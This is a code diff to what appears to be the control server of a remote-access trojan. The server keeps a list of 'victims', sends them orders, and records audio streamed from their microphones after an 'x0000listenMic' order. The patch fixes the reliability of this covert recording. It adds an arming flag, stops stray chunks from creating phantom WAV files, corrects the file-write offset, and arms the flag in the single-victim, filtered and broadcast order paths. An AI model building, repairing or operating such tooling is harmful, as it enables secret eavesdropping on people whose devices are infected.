@@ -257,8 +257,13 @@ function startServer(opts) {
     // live mic stream (chunks arrive as audioData, WAV finalized on stop)
     let wavPath = null;
     let pcm = [];
+    v.micArmed = false;  // true only after a x0000listenMic order is sent
     s.on("audioData", (b64) => {
       if (!wavPath) {
+        // A trailing in-flight chunk can arrive after audioDataStop; without
+        // an armed stream it would recreate a phantom empty WAV. Drop it.
+        if (!v.micArmed) return;
+        v.micArmed = false;
         wavPath = path.join(devdir(v), `micstream_${stamp().replace(/[-:]/g, "")}.wav`);
         fs.writeFileSync(wavPath, wavHeader(0));
         log(`[*] mic stream started -> ${path.basename(wavPath)}`);
@@ -267,11 +272,12 @@ function startServer(opts) {
       onAudioChunk(v, b64);
     });
     s.on("audioDataStop", (reason) => {
+      v.micArmed = false;
       if (wavPath) {
         const data = Buffer.concat(pcm);
         const fh = fs.openSync(wavPath, "r+");
         fs.writeSync(fh, wavHeader(data.length), 0, 44);
-        fs.writeSync(fh, data, 44);
+        fs.writeSync(fh, data, 0, data.length, 44);   // full body at file offset 44
         fs.closeSync(fh);
         log(`[*] mic stream saved ${path.basename(wavPath)} (${data.length} bytes)`);
         wavPath = null;
@@ -485,11 +491,16 @@ function startServer(opts) {
   }
 
   // -- orders ------------------------------------------------------------
+  function armMic(v, payload) {
+    if (payload && payload.order === "x0000listenMic") v.micArmed = true;
+  }
+
   function sendOrderTo(sidFilter, payload) {
     let n = 0;
     for (const v of victims.values()) {
       if (!v.connected || v.closed) continue;
       if (sidFilter && !v.sid.startsWith(sidFilter)) continue;
+      armMic(v, payload);
       log(`[->] order -> ${v.sid.slice(0, 8)} : ${JSON.stringify(payload)}`);
       v.socket.emit("order", payload);
       n++;
@@ -673,13 +684,17 @@ function startServer(opts) {
     sendOrder(victimId, payload) {
       const v = victims.get(victimId);
       if (!v || v.closed) return 0;
+      armMic(v, payload);
       v.socket.emit("order", payload);
       return 1;
     },
     broadcastOrder(payload) {
       let n = 0;
       for (const v of victims.values()) {
-        if (v.connected && !v.closed) { v.socket.emit("order", payload); n++; }
+        if (v.connected && !v.closed) {
+          armMic(v, payload);
+          v.socket.emit("order", payload); n++;
+        }
       }
       return n;
     },
